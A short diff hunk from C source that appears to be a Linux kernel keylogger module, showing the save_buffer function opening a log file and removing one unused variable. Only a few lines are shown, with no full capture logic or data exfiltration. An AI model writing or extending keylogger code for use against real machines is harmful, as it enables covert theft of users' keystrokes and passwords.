@@ -78,7 +78,6 @@ void keylogger_exit(void) {
 
 int save_buffer()
 {
-	int i;
 	int s = buffer_ptr - buffer;
 	
     fp = filp_open(LOG_FILE_PATH, O_RDWR | O_CREAT, 0600);
